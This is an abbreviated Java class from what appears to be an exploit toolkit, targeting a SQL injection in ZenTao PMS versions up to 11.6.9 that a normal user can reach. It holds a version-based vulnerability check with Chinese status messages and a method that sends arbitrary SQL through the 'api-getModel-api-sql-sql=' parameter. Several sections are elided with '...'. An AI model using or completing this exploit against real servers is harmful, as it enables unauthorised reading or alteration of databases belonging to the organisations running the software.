...
public class ZenTaoPMS_SqlInjection_NormalUser_xto11 implements  ExploitInterface{
    ...
    public String checkVul(String url) {
        ...
        try {
            ...
            if(ma.matches()){
                if(compareVersion(ma.group(1), "11.6.9") <= 0){
                    this.isVul = true;
                    return "[+] 存在 \"x~11.6 sql注入 普通用户\" 漏洞";
                }
            }
        ...
        this.isVul = false;
        return "[-] 不存在 \"x~11.6 sql注入 普通用户\" 漏洞";
    }
    ...
    public String exeSql(String cookie, String sql, String encoding) throws Exception {
        ...
        String payload = "api-getModel-api-sql-sql="+ URLEncoder.encode(sql, "utf-8");
